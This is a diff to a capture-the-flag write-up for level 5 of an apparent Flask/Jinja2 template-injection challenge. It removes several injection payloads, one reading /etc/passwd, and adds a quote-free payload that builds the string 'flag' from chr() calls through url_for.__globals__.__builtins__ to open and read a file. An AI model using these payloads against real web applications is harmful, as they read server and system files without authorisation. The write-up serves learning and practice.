@@ -88,23 +88,19 @@
 ### Level 5
 * For this level, it seems like single and double quotes are blocked
 
-* Luckily for us, flask has another way to pass in arguments as strings without quotes
-	* in fact, it has 6:
-1. request.args.name (GET)
-2. request.cookies.name (COOKIES)
-3. request.headers.name (HEAD)
-4. request.values.name (POST)
-5. request.form.name (POST)
-6. request.environ.name (ENVIRONMENT)
+* At first I wanted to use chr() to convert digits into an ascii representation of the string, but flask doesn't have a built-in chr() function
+	* Fortunately, we can still access python's chr() function
+
+* To figure out the integer representation of 'flag', i used `[ord(i) for i in 'flag']`, which gave me the numbers `[102, 108, 97, 103]`
+
 
 * Here's the payload I used:
+
 ```python3
-{{ ().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__.__builtins__['open']('flag').read() }}
-
-{{ ().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__.__builtins__[request.args.arg1]('flag').read() }}&arg1=open
-
-
-{{ ().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__.__builtins__[request.args.COMMAND](request.args.FILENAME).read() }}&COMMAND=open&FILENAME=flag
-
-{{ ().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read() }} post:arg1=open&arg2=/etc/passwd
+{{ url_for.__globals__.__builtins__.open(url_for.__globals__.__builtins__.chr(102) + url_for.__globals__.__builtins__.chr(108) + url_for.__globals__.__builtins__.chr(97) + url_for.__globals__.__builtins__.chr(103)).read()}}```
 ```
+#### Breaking down the payload
+1. To get the chr() function, we do the same thing as before, but access the [`__builtins__` module](https://docs.python.org/3/library/builtins.html), which has many useful functions, like `open()` and `chr()`
+	1. To get a character based on any ordinal value, we can write `url_for.__globals__.__builtins__.chr(NUM)`
+2. Thus, to get the whole `flag` string, we just append all of those together
+3. Then, we use `url_for.__globals__.__bultins__.open()` and pass in the flag string to read the flag file 
